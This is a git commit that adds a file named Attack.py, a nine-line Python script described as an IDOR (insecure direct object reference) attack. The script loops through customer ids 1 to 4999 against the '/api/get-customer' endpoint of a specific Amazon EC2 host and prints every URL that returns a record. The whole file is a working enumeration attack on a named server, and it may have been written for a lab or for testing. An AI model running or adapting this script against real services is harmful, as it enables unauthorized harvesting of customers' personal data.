f903c40ab687ed365020905f95675ad9fdea490b
rakeshls <73830663+rakeshls@users.noreply.github.com>
2023-04-06 19:37:00 +0530

    Add files via upload

---
+++ Attack.py
@@ -0,0 +1,9 @@
+# IDOR :- insure direct object refernce
+
+import requests
+for i in range(1,5000):
+   URL=f"http://ec2-3-108-196-161.ap-south-1.compute.amazonaws.com/api/get-customer?id={i}"
+   r= requests.get(url=URL)
+   if r.status_code == 200:
+      print(URL)
+
